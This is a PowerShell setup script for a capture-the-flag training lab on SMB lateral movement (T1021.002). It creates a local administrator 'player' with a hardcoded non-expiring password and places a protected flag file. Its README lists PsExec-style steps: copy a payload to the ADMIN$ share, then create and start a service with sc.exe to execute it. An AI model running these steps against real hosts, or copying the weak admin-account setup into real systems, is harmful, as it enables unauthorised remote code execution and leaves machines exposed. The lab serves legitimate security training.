#Requires -RunAsAdministrator
$PlayerUsr = "player"; $PlayerPwd = ConvertTo-SecureString "Player@123!" -AsPlainText -Force
$FlagPath  = "C:\Windows\System32\flag_T1021_002b.txt"
$Flag      = "HACKTIFY{SMB_PSEXEC_STYLE_$($env:COMPUTERNAME)}"
if (-not (Get-LocalUser $PlayerUsr -EA SilentlyContinue)) {
    New-LocalUser $PlayerUsr -Password $PlayerPwd -FullName "Player" -PasswordNeverExpires
    Add-LocalGroupMember -Group "Administrators" -Member $PlayerUsr }
Set-Content $FlagPath $Flag
$acl = Get-Acl $FlagPath; $acl.SetAccessRuleProtection($true,$false)
$acl.AddAccessRule((New-Object System.Security.AccessControl.FileSystemAccessRule("Administrators","FullControl","Allow")))
Set-Acl $FlagPath $acl
Set-Content "C:\Users\Public\Desktop\README.txt" @"
=== T1021.002 SMB – Manual PsExec-style Lateral Movement ===
Login   : $PlayerUsr / Player@123!
Goal    : Simulate PsExec technique manually using SMB + sc.exe:
          1. Copy payload to remote ADMIN$ share
          2. Create a service on the remote host via sc.exe
          3. Start the service to execute the payload
          4. Retrieve the flag
Steps   :
  copy payload.bat \\localhost\ADMIN$\payload.bat
  sc \\localhost create RemoteExecSvc binpath= "cmd.exe /c C:\Windows\payload.bat"
  sc \\localhost start RemoteExecSvc
  sc \\localhost delete RemoteExecSvc
"@
Write-Host "[+] T1021.002-B setup complete."
